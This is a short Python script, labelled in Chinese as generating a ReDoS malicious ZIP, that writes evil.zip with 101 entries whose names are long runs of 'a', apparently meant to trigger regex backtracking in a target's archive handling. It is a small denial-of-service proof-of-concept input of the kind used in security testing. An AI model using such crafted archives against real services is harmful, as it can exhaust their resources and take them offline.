#!/usr/bin/env python3
"""生成 ReDoS 恶意 ZIP"""
import zipfile, io

with zipfile.ZipFile("evil.zip", "w") as zf:
    for i in range(100):
        zf.writestr(f"{'a' * (i % 50 + 1)}/file{i}.txt", "data")
    zf.writestr("a" * 50, "data")

import os
print(f"evil.zip: {os.path.getsize('evil.zip')} bytes, 101 entries")
